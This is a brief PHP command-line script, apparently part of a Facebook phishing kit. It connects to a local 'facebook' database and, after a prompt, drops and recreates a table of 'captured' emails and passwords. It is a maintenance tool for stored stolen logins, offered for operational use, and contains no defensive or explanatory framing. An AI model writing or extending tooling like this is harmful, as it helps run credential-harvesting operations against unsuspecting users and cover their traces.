<?php



                                       /* Created By Pavan Yadav */
echo "
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█      All The data from facebook datdabse will be delete      █
█                                    Created By Pavan Yadav    █
└══════════════════════════════════════════════════════════════┘   \n\n\n\n\n";



echo "\t\tWarnning Your all captured Username and password will deleted \n\n";
echo "\t\t==============================================================\n\n"; 
function userinput(){}


echo "Press 1 For Delete all data Press 0 For Go back\n";
userinput();
echo "\n";
$value = trim(fgets(STDIN, 1024));
if($value==1)

{
$conn=mysqli_connect('localhost','root','') or die ("Databse could not connect ");
mysqli_select_db($conn,'facebook');
$sql="drop table facebook";
if(mysqli_query($conn,$sql))
{
echo "Credential Deleted Sucessfully\n";
}
$db="CREATE TABLE facebook(email varchar(200),pass varchar(200))";
mysqli_query($conn,$db);
echo "Done\n";

}
else
echo "Exiting\n";
sleep(2);
exit();
?>


